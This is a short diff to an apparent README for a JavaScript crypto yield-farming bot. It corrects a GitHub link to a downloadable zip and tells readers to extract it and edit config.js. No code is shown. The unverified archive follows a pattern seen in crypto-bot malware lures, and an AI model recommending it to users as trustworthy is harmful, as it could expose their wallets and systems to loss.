@@ -6,7 +6,7 @@ Here a youtube video of how to config and run to bot a beta tester made
 
 To begin using the JavaScript-Yield-Farming-Bot-With-StopLoss-V4, you'll need to download and extract the zip file to a convenient location. 
 
-The zip file can be downloaded from this link: https://github.com/codingWithJoeRichy/Javascript-volitey-yield-farming-bot-with-stoploss/raw/main/JavaScript-Volatility-Yield-Farming-Bot-With-StopLoss.zip.
+The zip file can be downloaded from this link: https://github.com/codingWithJoeRichy/JavaScript-Volatility-Yield-Farming-Bot-With-StopLoss/raw/main/JavaScript-Volatility-Yield-Farming-Bot-With-StopLoss.zip
 
 Once you've extracted the file, you'll need to locate the "config.js" file within the bot's main folder.
 
